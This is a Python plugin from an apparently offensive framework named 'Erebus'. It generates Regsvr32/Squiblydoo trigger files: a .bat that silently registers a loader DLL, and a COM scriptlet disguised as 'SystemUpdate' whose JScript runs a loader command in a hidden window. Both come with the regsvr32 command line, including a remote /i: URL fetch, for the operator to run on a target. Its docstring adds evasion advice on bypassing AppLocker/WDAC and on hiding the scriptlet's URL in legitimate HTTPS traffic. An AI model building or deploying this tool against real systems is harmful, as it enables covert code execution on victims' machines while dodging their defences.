"""
Regsvr32 / Squiblydoo trigger plugin (T1218.010).

Two sub-modes:
  local  - .bat launcher that calls: regsvr32.exe /s <dll>
           DLL must export DllRegisterServer; the builder compiles with that export stub.
  remote - COM scriptlet (.sct) invoked via:
           regsvr32.exe /s /n /u /i:<sct_path_or_url> scrobj.dll
           (Squiblydoo technique - no DLL required, JScript in the .sct runs the loader)

OPSEC notes:
  - regsvr32.exe is a signed Microsoft binary; proxy execution bypasses most
    default AppLocker / WDAC rules.
  - Remote (.sct) variant: regsvr32 spawns scrobj.dll which executes JScript via
    MSHTML; the parent-child chain is regsvr32 -> wscript (via WScript.Shell.Run).
  - Both variants are well-covered by Sigma rules targeting regsvr32 with /i: or
    scrobj.dll as a loaded module. EDR behavioral sensors typically flag this.
  - Use over legitimate HTTPS hosting for the .sct URL to blend with web traffic.
"""

import os
import uuid
from ..plugin_base import ErebusPlugin, PluginMetadata, PluginCategory


_plugin = ErebusPlugin(
    metadata=PluginMetadata(
        name="Regsvr32 Trigger",
        description="Produces Regsvr32/Squiblydoo trigger artifacts (T1218.010)",
        author="erebus",
        version="1.0.0",
        category=PluginCategory.TRIGGER,
        supported_os=["Windows"],
    )
)


_BAT_TEMPLATE = """\
@echo off
regsvr32.exe /s "{dll_path}"
"""

_SCT_TEMPLATE = """\
<?XML version="1.0"?>
<scriptlet>
<registration
    description="SystemUpdate"
    progid="SystemUpdate.1"
    version="1.00"
    classid="{{{classid}}}">
<script language="JScript">
<![CDATA[
  var oShell = new ActiveXObject("WScript.Shell");
  oShell.Run("{loader_cmd}", 0, false);
]]>
</script>
</registration>
</scriptlet>
"""


def create_regsvr32_trigger(payload_path: str, output_dir: str, **kwargs) -> dict:
    """
    Generate Regsvr32 trigger artifacts.

    Args:
        payload_path: For local mode: path to the loader DLL on the target.
                      For remote mode: full command line to invoke the loader binary.
        output_dir:   Directory where output files are written.
        **kwargs:
            mode (str):    "local" (default) or "remote" (Squiblydoo .sct).
            sct_url (str): For remote mode - the URL or UNC path the operator will
                           pass to regsvr32 /i:. If omitted, the local .sct path is
                           embedded in the run_cmd output.

    Returns:
        dict with keys:
            artifact_path - path to the .bat (local) or .sct (remote) file
            run_cmd       - command line the operator executes on the target
            mode          - "local" or "remote"
    """
    os.makedirs(output_dir, exist_ok=True)

    mode: str = str(kwargs.get("mode", "local")).lower()

    if mode == "remote":
        classid = str(uuid.uuid4()).upper()
        sct_filename = "update.sct"
        sct_path = os.path.join(output_dir, sct_filename)

        sct_content = _SCT_TEMPLATE.format(
            classid=classid,
            loader_cmd=payload_path.replace("\\", "\\\\"),
        )
        with open(sct_path, "w", encoding="utf-8") as fh:
            fh.write(sct_content)

        sct_target = kwargs.get("sct_url", sct_path)
        run_cmd = f"regsvr32.exe /s /n /u /i:{sct_target} scrobj.dll"

        return {
            "artifact_path": sct_path,
            "run_cmd": run_cmd,
            "mode": "remote",
        }

    # Local mode: .bat wrapper for DLL invocation.
    bat_filename = "install.bat"
    bat_path = os.path.join(output_dir, bat_filename)
    bat_content = _BAT_TEMPLATE.format(dll_path=payload_path)
    with open(bat_path, "w", encoding="utf-8") as fh:
        fh.write(bat_content)

    return {
        "artifact_path": bat_path,
        "run_cmd": f"regsvr32.exe /s \"{payload_path}\"",
        "mode": "local",
    }


def register():
    _plugin.register_function("create_regsvr32_trigger", create_regsvr32_trigger)
    return _plugin


def on_load():
    return register()
